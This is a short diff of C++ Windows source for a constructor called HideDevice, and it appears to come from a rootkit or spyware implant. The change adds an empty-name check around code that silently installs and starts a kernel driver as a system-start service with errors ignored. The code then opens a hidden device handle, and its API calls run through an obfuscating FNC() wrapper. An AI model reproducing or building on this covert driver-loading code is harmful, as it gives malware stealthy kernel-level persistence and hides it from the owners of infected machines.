@@ -608,18 +608,21 @@ HideDevice::HideDevice(WCHAR *driver_path) {
 		driver_name = driver_path;
 
 	SC_HANDLE sh=NULL, rh=NULL;
-	CheckDriverKey(driver_name);
-	do {
-		if (! (sh = FNC(OpenSCManagerA)(NULL, NULL, SC_MANAGER_CREATE_SERVICE )) )
-			break;
-		if (! (rh = FNC(CreateServiceW)(sh, driver_name, driver_name, SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START, SERVICE_ERROR_IGNORE, driver_path, NULL, NULL, NULL, NULL, NULL)) )
-			break;
-	} while(0);
-	FNC(StartServiceA)(rh, 0, NULL);
-	if (rh)
-		FNC(CloseServiceHandle)(rh);
-	if (sh)
-		FNC(CloseServiceHandle)(sh);
+	
+	if (driver_name[0]!=0) {
+		CheckDriverKey(driver_name);
+		do {
+			if (! (sh = FNC(OpenSCManagerA)(NULL, NULL, SC_MANAGER_CREATE_SERVICE )) )
+				break;
+			if (! (rh = FNC(CreateServiceW)(sh, driver_name, driver_name, SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START, SERVICE_ERROR_IGNORE, driver_path, NULL, NULL, NULL, NULL, NULL)) )
+				break;
+		} while(0);
+		FNC(StartServiceA)(rh, 0, NULL);
+		if (rh)
+			FNC(CloseServiceHandle)(rh);
+		if (sh)
+			FNC(CloseServiceHandle)(sh);
+	}
 	// Ora la DriverEntry è finita e il device è creato
 	hFile = FNC(CreateFileA)("\\\\.\\MSH4DEV1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
 }
